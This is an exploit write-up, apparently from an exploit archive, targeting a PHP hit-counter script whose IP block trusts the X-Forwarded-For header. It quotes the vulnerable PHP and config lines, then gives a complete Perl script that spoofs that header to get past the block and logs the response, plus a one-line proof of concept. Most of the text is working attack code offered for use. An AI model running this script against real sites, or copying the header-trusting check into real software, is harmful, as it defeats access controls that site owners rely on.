---------------------
Break System Block IP
---------------------

<<hits.php>>

7: if (@getenv("HTTP_X_FORWARDED_FOR")) 

   { $u_ip = @getenv("HTTP_X_FORWARDED_FOR"); } 

   else { $u_ip = @getenv("REMOTE_ADDR"); } 



   if ($u_ip == BLOCK_IP) 

    { return 1; 

13:  exit; } 

<<config.php>>

11: define("BLOCK_IP", "127.0.0.1"); 

<<exploit.pl>>

use HTTP::Request;
use LWP::UserAgent;

my $web="http://localhost/hits.php";
my $ua=LWP::UserAgent->new();
$ua->default_header('X-Forwarded-For' => "127.1.1.1");
my $respuesta=HTTP::Request->new(GET=>$web);
$ua->timeout(30);
my $response=$ua->request($respuesta);
$contenido=$response->content;
if ($response->is_success)
{
open(FILE,">>results.txt");
print FILE "$contenido\n";
close(FILE);
print "\n[+] Exploit Succesful!\n\n";
}
else
{
print "\n[-] Exploit Failed!\n\n";
}

<<proof of concept>>

$ua->default_header('X-Forwarded-For' => "127.1.1.1"); --> BREAK BLOCK_IP
